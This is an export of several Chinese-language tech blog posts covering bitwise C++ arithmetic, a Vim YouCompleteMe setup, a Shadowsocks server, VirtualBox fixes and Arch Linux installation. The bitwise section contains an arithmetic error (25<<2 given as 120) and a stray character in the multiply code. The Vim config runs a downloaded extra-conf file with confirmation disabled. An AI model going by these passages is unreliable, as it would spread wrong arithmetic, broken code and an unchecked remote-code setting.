(~b + 1 )int subtract(int a,int b)&#123; int negative=add(~b,1); // ~b + 1 return add(a,negative); &#125; 负数和正数转换(设x&gt;0)： -x=(~x+1) 如 -10=(~10+1)x=~(-x-1) 如 10=~(-10-1)x=~(-x)+1 如 10=~(-10)+1 乘法运算其实乘法也就是多个加法的累积求和，在我们小学时，25×5应该是这样计算的 1234567 2 5 × 0 5 ———————— 1 2 5+ 0 0 ———————— 1 2 5 二进制也可以这样计算，不过就是满2进1。这里还是以25×5=125为例 12345678 0 1 1 0 0 1 = 25 × 1 0 1 = 5———————————————————— 0 1 1 0 0 1 = 25+ 0 0 0 0 0 0 = 0+ 0 1 1 0 0 1 = 25&lt;&lt;2 = 25*2^2=120——————————————————— 0 1 1 1 1 1 0 1 = 125 = 25+120 将乘法分解为加法即可实现位运算，大致思路如下，存在一个函数 int multiply(int a,int b);1.若b&lt;0，则对b求负化为正数，同时设置一个标识neagtive_mask记录该b是负数2.对除数b不断右移b&gt;&gt;=1并且取得b最低位的值(0或1)，直到b=03.若为1，则add操作得sum4.a不断左移1位 a&lt;&lt;=15.结尾判断neagtive_mask来设置sum的正负 注意，除数如果为负数，假设为 11111111111111111111111111111011 (-5)，那么其右移得不到b=0，至于被除数可以小于0具体代码如下 1234567891011121314151617181920int multiply(int a,int b)&#123; // 判断正负 bool neagtive_mask=(b&lt;0); if(b&lt;0)&#123;2 b=~(b-1); // 化为正数: -x=(~x+1) &lt;-&gt; x=-(-x-1) (x&gt;0) &#125; int sum=0; while (b) &#123; if(b&amp;0x1)&#123; //取最低位，最低位为1，求和 sum=add(sum,a); //累加 &#125; b&gt;&gt;=1; // 除数右移将最低位溢出 a&lt;&lt;=1; // 被除数左移 &#125; if(neagtive_mask)&#123; sum=~(sum-1); &#125; return sum;&#125; 除法运算除法就相对来说复杂了，不过除法类似减法，不断地减去除数得到商，最后剩下余数这里还是以小学数学除法为例子 37÷3=12…1 123456789 12 -----3 | 37 - 3 ---- 7 - 6 --- 1 其中这操作还可以转换为 1234567891011121314151617步骤1 1 -----30 | 37 - 30 ---- 7 步骤2 2 ---- 3| 7 -6 --- 1 商: 1*10^1 + 2*10^0 = 10+2=12最后余下1 发现了什么吗？ 现在我们把上面十进制换成二进制 37: 1001013: 00117: 1101 12345678910111213141516171819202122232425步骤1 1 -------- 11000| 100101 -&gt;a=37 - 11000 ------- 1101 -&gt;7步骤2 1 ------1100| 1101 -&gt;a=7 - 1100 ------ 1步骤3 0 ------ 110| 1 - 0 ------ 1商: 1*2^3 + 1*2^2 + 0 = 1&lt;&lt;3 + 1&lt;&lt;2 + 0 = 8+4+0=12最后余下1 在上面例子中，除数3左移3位变为 11000，接着除数3左移2位变为 1100，最后左移1位变为 110。此时发现 被除数1 小于 除数110，因此商为0（C++语言中除法运算导致返回一个整数）。因此如果发现被除数小于除数，那么直接返回0即可。 于是要先找到除数应该左移的位数，且使得除数是&lt;=除数然后利用减法 :a=subtract(a,b&lt;&lt;nMove) 利用加法 :当前累加值r=add(前一个值累加值r,1&lt;&lt;nMove) 代码如下 1234567891011121314151617181920212223242526272829303132int divide(int a,int b)&#123; int nMove=0; bool negative_mask=false; if(a&lt;0)&#123; a=~(a-1); // 化正 negative_mask=true; &#125; if(b&lt;0)&#123; b=~(b-1); // 化正 // 同号得正，异号的负 negative_mask=negative_mask==false?true:false; &#125; if(a&lt;b)&#123;return 0;&#125; // 找到除数应该左移的位数，且使得除数是&lt;=除数 for ( nMove = 0; nMove&lt;32;nMove++)&#123; if((b&lt;&lt;nMove)&gt;=a)&#123; break; &#125; &#125; int r=0; for (int i = nMove; i &gt;=0; i--)&#123; int t=b&lt;&lt;i; if(a&lt;t) // 被除数小于除数 continue; a=subtract(a,t); r=add(r,1&lt;&lt;i); &#125; if(negative_mask)&#123; r=~(r-1); &#125; return r;&#125; 输出二进制1234567891011void printBinary(int number)&#123; char strBinary[33]&#123; 0 &#125;; unsigned int bitmask = 1 &lt;&lt; 31; for (int i = 0; i &lt; 32; i++) &#123; char k = ((number &amp; bitmask)&gt;&gt;31)?'1':'0'; strBinary[i] = k; number &lt;&lt;= 1; &#125; cout &lt;&lt; strBinary &lt;&lt; endl;&#125; 简单数据交换利用xor位异或来实现值交换 原理: a ^ a = 0a ^ 0 = a0 ^ a = a 1234int a=10,b=20;a=a^b; // a=a^b;b=a^b; // b=(a^b)^b=a^(b^b)=a^0=a;a=a^b; // a=(a^b)^a=(a^a)^b=0^b=b; bye~]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Vim YCM配置]]></title>
    <url>%2Flinux-ycm-vim%2F</url>
    <content type="text"><![CDATA[由于之前不小心把vim的配置删了，致使之前的那篇文章无法访问，但为了回应有关网友的回复，特此重新编辑了vim的ycm配置。:) YCM全称 YouCompleteMe，是一个vim插件，但是却是一个能够使代码自动补全的工具。虽然如此，但也还是无法与专用IDE相媲美，不过对于vim党来说却是一个十分有趣的插件。 安装前要使VIM配置YCM，则必须确保Vim支持Python2和Python3，可以用 vim --version 查看是否支持。否则请自行从源代码安装vim。 我的系统是archlinux，vim版本为8.2 安装YCM(Vundle)YCM github： https://github.com/ycm-core/YouCompleteMe 推荐通过 Vundle 安装 YCM，在此之前，需要安装 Vundle： https://github.com/VundleVim/Vundle.vim 1git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim 之后可以编辑 ~/.vimrc 文件 12345678910set nocompatiblefiletype off set rtp+=~/.vim/bundle/Vundle.vimcall vundle#begin()...Plugin 'VundleVim/Vundle.vim'...call vundle#end()filetype plugin indent on 一般来说，vundle常用用法如下 12345:PluginList - 列举配置插件:PluginInstall - 安装 ‘Plugin’ 之后的插件:PluginUpdate - 更新插件:PluginSearch foo - 寻找插件 foo并添加的本地配置:PluginClean - 删除未被使用的插件 支持C/C++要使YCM支持C语言的自动补全，还需要配置YCM，首先在 .vimrc 添加一行 12345call vundle#begin(). . . Plugin 'Valloric/YouCompleteMe’. . .call vundle#end() 进入vim后 :PluginInstall ，然后在进行编译YCM，当然还有 ./install.sh –all ，不过我就不怎么配置了。 注意还要安装 cmake 12cd ~/.vim/bundle/YouCompleteMe./install.sh --clang-completer 如果是Git YCM的，那么还需要在该目录下执行 12git clone https://github.com/ycm-core/YouCompleteMe.gitgit submodule update --init --recursive 下载安装libclang由于我的系统是archlinux，所以可以直接 1sudo pacman -S clang boost llvm-libs 其他linux系统比如Ubuntu，需要安装 llvm，clang，libclang，libboost。 编译构建 ycm_core 库编译构建ycm_core库需要安装 cmake和python3-dev创建一个用于存放编译过程的产生的文件 12345678910111213141516171819202122232425262728293031# mkdir ~/ycm_build# cd ~/ycm_build# cmake -G "Unix Makefiles" -DUSE_SYSTEM_BOOST=ON -DUSE_SYSTEM_LIBCLANG=ON . ~/.vim/bundle/YouCompleteMe/third_party/ycmd/cpp输出：-- The C compiler identification is GNU 9.1.0-- The CXX compiler identification is GNU 9.1.0-- Check for working C compiler: /usr/bin/cc-- Check for working C compiler: /usr/bin/cc -- works-- Detecting C compiler ABI info-- Detecting C compiler ABI info - done-- Detecting C compile features-- Detecting C compile features - done-- Check for working CXX compiler: /usr/bin/c++-- Check for working CXX compiler: /usr/bin/c++ -- works-- Detecting CXX compiler ABI info-- Detecting CXX compiler ABI info - done-- Detecting CXX compile features-- Detecting CXX compile features - done-- Found PythonLibs: /usr/lib/libpython2.7.so (found suitable version "2.7.16", minimum required is "2.7") -- Using libclang to provide semantic completion for C/C++/ObjC-- Found Boost: /usr/include (found version "1.69.0") found components: filesystem regex -- Using external libclang: /usr/lib/libclang.so.8-- NOT using clang-tidy for static analysis.-- Configuring done-- Generating done-- Build files have been written to: /home/joxrays/ycm_build# cmake --build . --target ycm_core --config Release --config Release 针对 Windows，对于Linux/Unix忽略若无错误之后可看到 `Linking CXX shared library /home/joxrays/.vim/bundle/YouCompleteMe/third_party/ycmd/ycm_core.so` 至此YCM_CORE编译完成，接下来就可以 1cp ~/.vim/bundle/YouCompleteMe/third_party/ycmd/examples/.ycm_extra_conf.py ~/.vim/ vim配置文件+插件我先把我的vimrc配置文件贴出了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102set nocpset modelines=0set backspace=2syntax on autocmd InsertLeave * se noculautocmd InsertEnter * se culset smartindent set autoindentset confirm set tabstop=4 set softtabstop=4set shiftwidth=4 set expandtab set numberset history=50 set hlsearchset incsearchset gdefaultset encoding=utf-8set fileencodings=utf-8,ucs-bom,shift-jis,gb18030,gbk,gb2312,cp936,utf-16,big5,euc-jp,latin1set guifont=Menlo:h16:cANSI set langmenu=zn_CN.UTF-8set helplang=cn set ruler set laststatus=1 set showcmd set scrolloff=3set showmatch set matchtime=5set autowrite set wildmenu set linespace=2 set whichwrap=b,s,&lt;,&gt;,[,] set foldenable set cursorline set magic set ignorecaseset background=darkset t_Co=256 set mouse=i set backspace=indent,eol,startset nocompatibleset rtp+=~/.vim/bundle/Vundle.vimcall vundle#begin()Plugin 'VundleVim/Vundle.vim'Plugin 'Valloric/YouCompleteMe'Plugin 'altercation/vim-colors-solarized'Plugin 'scrooloose/nerdtree'Plugin 'scrooloose/nerdcommenter'Plugin 'majutsushi/tagbar'Plugin 'whatyouhide/vim-gotham'Plugin 'vim-airline/vim-airline'Plugin 'vim-airline/vim-airline-themes'call vundle#end()filetype plugin indent onautocmd CursorMovedI,InsertLeave * if pumvisible() == 0|silent! pclose|endifautocmd InsertLeave * if pumvisible() == 0|pclose|endifset completeopt=longest,menuhighlight Pmenu guibg=darkgrey guifg=blackhighlight PmenuSel guibg=lightgrey guifg=blackinoremap &lt;expr&gt; &lt;Down&gt; pumvisible() ? "\&lt;C-n&gt;" : "\&lt;Down&gt;"inoremap &lt;expr&gt; &lt;Up&gt; pumvisible() ? "\&lt;C-p&gt;" : "\&lt;Up&gt;"inoremap &lt;expr&gt; &lt;PageDown&gt; pumvisible() ? "\&lt;PageDown&gt;\&lt;C-p&gt;\&lt;C-n&gt;" : "\&lt;PageDown&gt;"inoremap &lt;expr&gt; &lt;PageUp&gt; pumvisible() ? "\&lt;PageUp&gt;\&lt;C-p&gt;\&lt;C-n&gt;" : "\&lt;PageUp&gt;"inoremap &lt;expr&gt; &lt;CR&gt; pumvisible() ? "\&lt;C-y&gt;" : "\&lt;CR&gt;"let g:ycm_key_list_select_completion = ['&lt;Down&gt;']let g:ycm_key_list_previous_completion = ['&lt;Up&gt;']let g:ycm_goto_buffer_command = 'horizontal-split'let g:ycm_server_python_interpreter='/usr/bin/python2'let g:ycm_global_ycm_extra_conf = '~/.vim/.ycm_extra_conf.py'let g:airline#extensions#tabline#enabled = 1let g:ycm_seed_identifiers_with_syntax = 1let g:ycm_complete_in_strings = 1let g:ycm_collect_identifiers_from_tags_files = 1let g:ycm_complete_in_comments = 1let g:ycm_min_num_of_chars_for_completion = 2let g:ycm_cache_omnifunc=0let g:ycm_confirm_extra_conf=0syntax enable"colorscheme solarized"colorscheme gothamcolorscheme jellybeanslet g:solarized_termcolors=256let g:NERDTreeDirArrowExpandable = '▸'let g:NERDTreeDirArrowCollapsible = '▾'map &lt;C-b&gt; :NERDTreeToggle&lt;CR&gt;map &lt;C-m&gt; :Tagbar&lt;CR&gt;let g:tagbar_ctags_bin='ctags'let g:tagbar_width=30 之后只需在 vim 中 :PluginInstall 安装插件，可能需要点时间… taglist是一个用于显示定位程序中各种符号的插件。这里我使用的是tagbar，它是一个taglist的替代品，要是有tagbar还需要生成 tags 文件，生成方法可以参考 https://www.vim.org/scripts/script.php?script_id=2358 。 首先要从该网站下载 cpp_src.tar.bz2 ，解压后是一个 cpp_src目录，然后执行一下命令 12ctags -R --c++-kinds=+p --fields=+iaS --extra=+q --language-force=C++ cpp_srcmv tags ~/.vim 而对于Vim颜色配置，比如本例中 jellybeans，则 1234mkdir -p ~/.vim/colorscd ~/.vim/colorscurl -O https://raw.githubusercontent.com/nanotech/jellybeans.vim/master/colors/jellybeans.vim然后在 .vimrc 中设置 colorscheme jellybeans 注意，如果 let g:ycm_global_ycm_extra_conf = &#39;~/.vim/.ycm_extra_conf.py&#39; 中 默认的 .ycm_extra_conf.py ，可能会出现一些莫名其妙的错误，那么可以下载该文件替换原有的 *.ycm_extra_conf.py *https://raw.githubusercontent.com/theodelrieu/dotfiles/master/.ycm_extra_conf.py 12cd ~/.vim/curl -O https://raw.githubusercontent.com/theodelrieu/dotfiles/master/.ycm_extra_conf.py 结尾基本上YCM配置到此结束了，也没有想象中的那么难啦～现在vim支持Python和C/C++代码补全了最后贴一张测试图： 有啥问题可联系我哈~ bye]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
        <tag>YCM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS服务器Shadowsocks]]></title>
    <url>%2Fcentos-shadowsocks%2F</url>
    <content type="text"><![CDATA[在很久之前我用Windows时一直使用 SoftEther VPN 来访问外网，但现在已经转向了SS，而且仅是通过转发流量来科学上网的话，无疑SS是最合适的，因此在 hostwinds 上也买了一台centos7服务器准备搭建shadowsocks。 Shadowsocks官网： https://shadowsocks.org/en/index.htmlShadowsocks配置介绍： https://shadowsocks.org/en/config/quick-guide.htmlGithub：https://github.com/shadowsocks/ SS配置服务器查看python版本 12[root@hwsrv-548851 ~]# python --versionPython 2.7.5 我的centos服务器默认没有安装Python Pip，同时可能还需要更新pip 12[root@hwsrv-548851 ~]# yum install python-pip[root@hwsrv-548851 ~]# pip install --upgrade pip 之后就可以通过pip安装shadowsocks 1[root@hwsrv-548851 ~]# pip install shadowsocks 到此SS服务端安装完成，接下来还需要json格式的配置文件 12345678910111213141516&#123; &quot;server&quot;:&quot;my_server_ip&quot;, &quot;server_port&quot;:8388, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;barfoo!&quot;, &quot;timeout&quot;:600, &quot;method&quot;:&quot;chacha20-ietf-poly1305&quot;&#125;server: 服务器主机IP，默认 0.0.0.0server_port: 服务器端口 ，默认 8388local_address: 一般为 127.0.0.1local_port: 本地端口，一般 1080password: 连接SS服务器的密码timeout: 连接超时时间/s ，默认 300method: 加密方式，默认 aes-256-cfb 如果要从命令行来启动服务端，则可以 1[root@hwsrv-548851 ~]# ssserver -p 8998 -k mypassword 一般都是从配置文件来启动ss服务端类似如下 config.json 123456789&#123; &quot;server&quot;: &quot;104.168.xxx,xxx&quot;, &quot;server_port&quot;: 8998, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;: &quot;1080&quot;, &quot;password&quot;: &quot;mypassword&quot;, &quot;timeout&quot;: 60, &quot;method&quot;: &quot;aes-256-cfb&quot;&#125; 使用配置文件启动服务端并在后台运行： ssserver -c config.json -d start ，检测是否成功启动 123[root@hwsrv-548851 ~]# netstat -anp|grep -i 8998tcp 0 0 104.168.xxx,xxx:8998 0.0.0.0:* LISTEN 27701/python2 udp 0 0 104.168.xxx,xxx:8998 0.0.0.0:* 27701/python2 SS配置客户端SS的客户端分为Windows，MacOS，Linux，Android，iOS和OpenWRT这里介绍Windows，Linux Linux对于archlinux最直接的方法： sudo pacman -S shadowsocks-qt5 从GUI连接ss服务器也可以从pip下载shadowsocks： pip install shadowsocks，然后再创建一个同服务端的config.json配置文件如 sslocal -c config.json -d start WIndowsWindows下的 ss客户端 也可以从Python pip安装 shadowsocks 。也可以从 https://github.com/shadowsocks/shadowsocks-windows/releases 下载 不过如果从pip下载 shadowsocks，那么是无法直接启动的，解决方法如下：到 https://slproweb.com/products/Win32OpenSSL.html 下载最新版Windows openssl安装，然后去openssl安装目录 C:\Program Files\OpenSSL-Win64 找到 libcrypto-1_1-x64.dll 复制到 Python Scripts目录并重命名为libcrypto.dll 。否则提示 libcrypto(OpenSSL) not found 错误。 完成以上时运行 sslocal -c config.json 会提示错误 AttributeError: function &#39;EVP_CIPHER_CTX_cleanup&#39; not found 原因是 openssl1.1.0版本中，废弃了EVP_CIPHER_CTX_cleanup 函数，可以用 EVP_CIPHER_CTX_reset 函数替代EVP_CIPHER_CTX_cleanup 函数。 那么我们只需打开 C:\Users\Administrator\AppData\Local\Programs\Python\Python37\Lib\site-packages\shadowsocks\crypto\openssl.py 文件(路径可能不同)，将 EVP_CIPHER_CTX_cleanup 全部替换为 EVP_CIPHER_CTX_reset，总共两处需要修改，之后保存即可。 执行 sslocal -c config.json 成功！ 参考 Shadowsocks Server Shadowsocks Client]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>Shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VirtualBox添加raw disk时出现VERR_ACCESS_DENIED]]></title>
    <url>%2Fvirtualbox-addrawdisk-err%2F</url>
    <content type="text"><![CDATA[本来想在virtualbox里U盘启动，用 vboxmanage 创建就可以完成的然而却在启动时发生了错误，这里把错误过程记录下来 过程插上U盘后 lsblk 后即可找到U盘的设备名称如 /dev/sda，如果直接 vboxmanage internalcommands createrawvmdk -filename usb.vmdk -rawdisk /dev/sda 提示没有权限只需，那么可以root权限执行该命令，的确成功了，OK。 但是当我尝试在virtualbox存储介质中载入虚拟盘时，却发生了一个奇怪的错误：virtualbox没有权限访问usb.vmdk 123456789101112Permission problem accessing the file for the medium &apos;/home/joxrays/usb.vmdk&apos; (VERR_ACCESS_DENIED).返回 代码: VBOX_E_FILE_ERROR (0x80BB0004)组件: MediumWrap界面: IMedium &#123;ad47ad09-787b-44ab-b343-a082a3f2dfb1&#125;被召者: IVirtualBox &#123;d0a0163f-e254-4e5b-a1f2-011cf991c38d&#125;被召者 RC: VBOX_E_OBJECT_NOT_FOUND (0x80BB0001) 无论我chown还是chmod并没有解决该问题。经过Google后在 stackexchange 找到了问题的解决方法 12sudo usermod -aG disk $USER或者 sudo gpasswd -a $USER disk 很简单，仅是讲当前用户添加到 disk组，之后注销重新登录就好了。 之后在执行如下命令就看创建一个.vmdk虚拟盘文件了。 1vboxmanage internalcommands createrawvmdk -filename usb.vmdk -rawdisk /dev/sda 关于disk组，在archlinux wiki上是这样解释： Access to block devices not affected by other groups such as optical, floppy, and storage 。也就是说加入了disk组的用户能够访问那些不受 optical ，floppy 和 storage组控制的块设备。 如果想要把用户从disk组中删除，则 1sudo gpasswd -d $USER disk 参考 VERR_ACCESS_DENIED when trying to add a raw disk to virtual box Users_and_groups]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>VirtualBox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Terminal 显示图像]]></title>
    <url>%2Flinux-tiv%2F</url>
    <content type="text"><![CDATA[其实很久之前我就在想linux终端里能否显示图像呢？然而这个问题一直拖延至今，直到google过程中发现了Tiv(TerminalImageViewer) Tiv本文我要介绍的是tiv这个小巧的工具，它是由C++写成的Github: https://github.com/stefanhaustein/TerminalImageViewer tiv使用RGB ANSI代码和unicode块图形字符在（现代）终端中显示图像，这也就是说tiv只能 像素化 的显示图像。 123git clone https://github.com/stefanhaustein/TerminalImageViewer.gitcd TerminalImageViewer/src/main/cppmake 之后即可运行tiv ./tiv -help 查看帮助 123456789101112Terminal Image Viewerusage: tiv [options] &lt;image&gt; [&lt;image&gt;...] -0 : No block character adjustment, always use top half block char. -256 : Use 256 color mode. -c &lt;num&gt; : Number of thumbnail columns in &apos;dir&apos; mode (3). -d : Force &apos;dir&apos; mode. Automatially selected for more than one input. -f : Force &apos;full&apos; mode. Automatically selected for one input. -help : Display this help text. -h &lt;num&gt; : Set the maximum height to &lt;num&gt; lines. -w &lt;num&gt; : Set the maximum width to &lt;num&gt; characters. ./tiv ~/1.png 当然还可以 ./tiv ~/1.png -0 当然我也试过 fim 但觉得总有点差强人意，最后还是选择tiv，尽管它只能像素化的显示图像。。。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VirtualBox安装manjaro后安装增强功能]]></title>
    <url>%2Fvirtual-manjaro-guest-iso%2F</url>
    <content type="text"><![CDATA[一般来说，VirtualBox成功安装manjaro后可以在 [设备] -&gt; [安装增强功能]。然而有时却事与愿违的怎么也无法安装，那么这时我们就可以在manjaro里自行安装 VBoxGuestAdditions，let’s go! virtualbox-guest-iso1sudo pacman -S virtualbox-guest-iso 这是必须的，如此之外还可以访问官网 https://download.virtualbox.org/virtualbox/6.0.10/ 下载。目前我的版本是6.0.10。下载后的iso文件存放路径为 /usr/lib/virtualbox/additions/VBoxGuestAdditions.iso linux header这时就能够挂载iso镜像文件(root权限) 12sudo mount /usr/lib/virtualbox/additions/VBoxGuestAdditions.iso /mntcd /mnt 我们只需关心 VBoxLinuxAdditions.run ，若直接 sudo sh VBoxLinuxAdditions.run ，可能会导致安装不成功，如下消息 ifying archive integrity… All good.Uncompressing VirtualBox 6.0.10 Guest Additions for Linux……..VirtualBox Guest Additions installerRemoving installed version 6.0.10 of VirtualBox Guest Additions…Copying additional installer modules …Installing additional modules …VirtualBox Guest Additions: Starting.VirtualBox Guest Additions: Building the VirtualBox Guest Additions kernelmodules. This may take a while.VirtualBox Guest Additions: To build modules for other installed kernels, runVirtualBox Guest Additions: /sbin/rcvboxadd quicksetup VirtualBox Guest Additions: orVirtualBox Guest Additions: /sbin/rcvboxadd quicksetup allVirtualBox Guest Additions: Building the modules for kernel 4.19.62-1-MANJARO. This system is currently not set up to build kernel modules.Please install the Linux kernel “header” files matching the current kernelfor adding new hardware support to the system.VirtualBox Guest Additions: Running kernel modules will not be replaced untilthe system is restarted 这表明目前系统没有安装 linux header 文件，解决方法如下(注意内核版本)： 1234uname -r4.19.62-1-MANJAROsudo pacman -S linux419-headerssudo pacman -S linux419-virtualbox-guest-modules PS： 若 sudo pacman -S linux-headers ，我这manjaro默认安装为 linux316-headers-3.16.71-1。相反 archlinux安装的是最新版本…… 接着就可以执行 sudo sh VBoxLinuxAdditions.run 来安装 VirtualBox Guest Additions，该过程可能需要一些时间来构建内核模块。若没有出现红字部分，则表明安装成功，重启即可使用该功能]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Archlinux从安装到基本配置]]></title>
    <url>%2Farchlinux-configure%2F</url>
    <content type="text"><![CDATA[这里介绍从安装archlinux系统到基本配置过程，基本搜集了网上和官方wiki整理而来的，把错误最低化。当然，本文也是作为我的一份手册吧… 安装Archlinux下载Archlinux ISO到官网下载 https://www.archlinux.org/download/ 并做成U盘启动盘 一系列的命令…(BIOS)由于我是有线连接网络的，所以… 反正也可以在虚拟机里试下呗 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849dhcpcd(可选)ping www.baidu.comtimedatectl set-ntp truefdisk /dev/sda # 分区这里应人而异。我就不多说了 ... ...mkfs.ext4 /dev/sdaX ... ...mkswap /dev/sdaY # 交换分区swapon /dev/sdaYmount /dev/sda1 /mntnano /etc/pacman.d/mirrorlist # 添加 Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$archpacstrap /mnt base base-develgenfstab -U /mnt &gt;&gt; /mnt/etc/fstabarch-chroot /mntln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc --localtimenano /etc/locale.gen en_US.UTF-8 UTF-8 zh_CN.UTF-8 UTF-8 ...locale-genecho LANG=en_US.UTF-8 &gt; /etc/locale.confecho myhostname &gt; /etc/hostnamenano /etc/hosts 127.0.0.1 localhost ::1 localhost 127.0.1.1 myhostname myhostnamepasswdpacman -S grubgrub-install --target=i386-pc /dev/sda #BIOS系统 ，默认 i386-pcgrub-mkconfig -o /boot/grub/grub.cfgexitumount -R /mntrebootpacman -S sudo net-tools wireless_toolsuseradd -m -G wheel whoamipasswd whoaminano /etc/sudoers # %wheel ALL=(ALL)ALL 取消注释rebootsudo dhcpcdifconfig # 安装显卡驱动sudo pacman -S xf86-video-intel # 安装Xorg开源图形服务sudo pacman -S xorg UEFI如果是UEFI，那么可以用 fdisk 或 parted 分区，grub引导 12345678910111213141516171819parted /dev/sda mklabel gptparted /dev/sda mkpart ESP fat32 1M 513Mparted /dev/sda set 1 boot onparted /dev/sda mkpart primary ext4 513M 20.5G # 20.5G 为绝对大小parted /dev/sda mkpart primary ext4 20.5G 100%mkdir /mnt/bootmkfs.fat -F32 /dev/sda1mkfs.ext4 /dev/sda2mount /dev/sda1 /mnt/bootmount /dev/sda2 /mntpacstrap /mnt base base-develgenfstab -L /mnt &gt;&gt; /mnt/etc/fstab......pacman -S grub efibootmgrgrub-install --target=x86_64-efi --efi-directory=esp --bootloader-id=GRUB grub-mkconfig -o /boot/grub/grub.cfg 可选桌面环境安装接着还需要按照桌面环境 GNOME12sudo pacman -S gnome gnome-extragnome-session KDE12sudo pacman -S plasma kde-applicationsstartkde Deepin1234567891011sudo pacman -S deepin deepin-extra1. lightdmnano /etc/lightdm/lightdm.conf [Seat:*] ... greeter-session=lightdm-deepin-greeter 2. Xinitnano ~/.xinitrc exec startddestartx Xfce12sudo pacman -S xfce4 xfce4-goodiesstartxfce4（手动进入桌面） 安装桌面登录管理器(自行选择)12345678sudo pacman -S sddmsudo systemctl enable sddmsudo pacman -S gdmsudo systemctl enable gdmsudo pacman -S lightdm lightdm-gtk-greetersudo systemctl enable lightdm 配置网络123sudo pacman -S network-manager-appletsudo systemctl disable netctlsudo systemctl enable NetworkManager 启动蓝牙安装了KDE话，默认是未找到蓝牙适配器的。若要连接到蓝牙耳麦，那么可以这样做 1234567sudo pacman -S bluez bluez-utils pulseaudio-bluetooth pavucontrol pulseaudio-alsasudo systemctl enable bluetoothusermod -aG lp $USERsudo systemctl start bluetoothpulseaudio -kpulseaudio --start 软件仓库镜像123456789101112131415161718192021222324252627282930313233343536373839nano /etc/pacman.d/mirrorlist Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch Server = http://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch Server = http://mirrors.aliyun.com/archlinux/$repo/os/$arch Server = http://mirrors.163.com/archlinux/$repo/os/$arch Server = http://mirrors.hust.edu.cn/archlinux/$repo/os/$arch Server = http://run.hit.edu.cn/archlinux/$repo/os/$arch Server = http://ftp.kaist.ac.kr/ArchLinux/$repo/os/$arch Server = http://mirrors.hustunique.com/archlinux/$repo/os/$arch Server = http://ftp.jaist.ac.jp/pub/Linux/ArchLinux/$repo/os/$arch Server = http://mirror.premi.st/archlinux/$repo/os/$arch Server = http://mirror.its.dal.ca/archlinux/$repo/os/$arch Server = http://mirror.de.leaseweb.net/archlinux/$repo/os/$arch Server = http://mirror.clibre.uqam.ca/archlinux/$repo/os/$arch nano /etc/pacman.conf [multilib] Include = /etc/pacman.d/mirrorlist [archlinuxcn] Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch 或者： [archlinuxcn] Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch安装 archlinuxcn-keyring 导入 GPG keysudo pacman -S archlinuxcn-keyring 直接这样会出错sudo pacman -Syu havegedsudo systemctl start havegedsudo systemctl enable havegedsudo rm -fr /etc/pacman.d/gnupgsudo pacman-key --initsudo pacman-key --populate archlinuxsudo pacman-key --populate archlinuxcnsudo pacman -S archlinuxcn-keyringsudo pacman -Syu 解决： 错误：无法提交处理 (无效或已损坏的软件包 (PGP 签名)) 此处参考： GnuPG-2.1 与 pacman 密钥环 Arch Linux 中文社区仓库 / 镜像加速源安装字体(中文) 123456781. sudo pacman -S adobe-source-han-sans-cn-fonts (思源黑体)2. sudo pacman -S ttf-dejavu3. sudo pacman -S wqy-zenhei4. sudo pacman -S wqy-microheinano /etc/locale.conf LANG=zh_CN.UTF-8reboot 推荐安装 FireCode 自体 https://github.com/tonsky/FiraCode 中文输入法目前 fcitx-im 取消了 fcitx-qt4 : https://www.archlinux.org/groups/x86_64/fcitx-im/ 导致搜狗输入法无法在archlinux上正常使用 ，而网上大多数的方法无法在archlinux下使用。正确姿势应该是： 123456789sudo pacman -S fcitx-lilydjwg-git fcitx-qt5 fcitx-configtoolnano ~/.xprofile export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS="@im=fcitx"sudo pacman -S fcitx-sogoupinyin# sudo pacman -S fcitx-googlepinyin ... PS: 目前 fcitx-lilydjwg-git 已经包含了 fcitx-qt4 这个包 如果已经安装了搜狗输入法了，那么只需安装 fcitx-qt4 这个包 1yay fcitx-qt4 注销重新登录亲测在archlinux和manjaro成功！ 安装Icon主题(可选)1pacman -S numix-circle-icon-theme-git pacman彩色输出编辑 /etc/pacman.conf，取消 Color 注释 Nano 支持代码高亮nano是linux下轻量级的文本编辑器，也是大多数linux发行版都默认安装的。但默认安装archlinux后 nano对于特殊文本的代码高亮支持并没有开启，因此要想让代码高亮显示，就要手动开启该功能。 首先nano所支持的一些代码格式文件存放在 /usr/share/nano/ 目录下 12345678910$ ls /usr/share/nano/asm.nanorc elisp.nanorc json.nanorc objc.nanorc ruby.nanorcautoconf.nanorc fortran.nanorc lua.nanorc ocaml.nanorc rust.nanorcawk.nanorc gentoo.nanorc makefile.nanorc patch.nanorc sh.nanorcchangelog.nanorc go.nanorc man.nanorc perl.nanorc spec.nanorccmake.nanorc groff.nanorc mgp.nanorc php.nanorc tcl.nanorcc.nanorc guile.nanorc mutt.nanorc po.nanorc texinfo.nanorccss.nanorc html.nanorc nanohelp.nanorc postgresql.nanorc tex.nanorcdebian.nanorc java.nanorc nanorc.nanorc 